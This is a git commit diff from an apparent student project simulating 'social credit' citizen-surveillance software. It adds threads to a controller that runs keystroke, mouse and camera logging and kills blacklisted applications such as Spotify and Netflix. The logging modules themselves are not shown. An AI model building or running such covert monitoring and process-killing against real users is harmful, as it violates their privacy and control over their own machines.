2dc6ad208fdf878476df15020b921bab7915d60e
s200310-student-mannheim-dhbw <104125853+s200310-student-mannheim-dhbw@users.noreply.github.com>
2022-06-11 00:23:43 +0200

    Majoor update to entire buerger software

--- PSICO-Buerger-Software/controller.py
+++ PSICO-Buerger-Software/controller.py
@@ -2,6 +2,8 @@ from modules.keylogger.keylogger import KeyLogger
 from modules.mouselogger.mouselogger import MouseLogger
 from modules.task.task import Task
 from modules.sccontroller.sccontroller import SocialCreditController
+from modules.camera.camera import CameraLogger
+from modules.popup.popup import PopUp
 
 from queryController import QueryController
 import threading
@@ -35,10 +37,21 @@ class CitizenController:
         SCCONTROLLER = SocialCreditController(QUERY_CONTROLLER)
         thr4 = threading.Thread(target=SCCONTROLLER.main, args=())
         thr4.start()
+        TASKKILLER = Task(QUERY_CONTROLLER, self.blackListTasks)
+        thr5 = threading.Thread(target=TASKKILLER.killEverything, args=())
+        thr5.start()
+        MOTIVATIONKEEPER = PopUp()
+        thr6 = threading.Thread(target=MOTIVATIONKEEPER.productivityEnhancement, args=())
+        thr6.start()
+        thr7 = threading.Thread(target=MOUSELOGGER.cpm, args=())
+        thr7.start()
+        CAMERALOGGER = CameraLogger(QUERY_CONTROLLER)
+        thr8 = threading.Thread(target=CAMERALOGGER.main, args=())
+        thr8.start()
 
 """
 Start the controller.py script by initializing a controller object and running the start method
 """
 if __name__ == "__main__":
-    CITIZEN_CONTROLLER = CitizenController(None, ["DHBW", "Python ist gut"], ['Spotify', 'Netflix'])
+    CITIZEN_CONTROLLER = CitizenController(None, ["DHBW", "Kruse", "Malware", "Python ist gut"], ['Spotify', 'Netflix', 'LibreOffice'])
     CITIZEN_CONTROLLER.start()
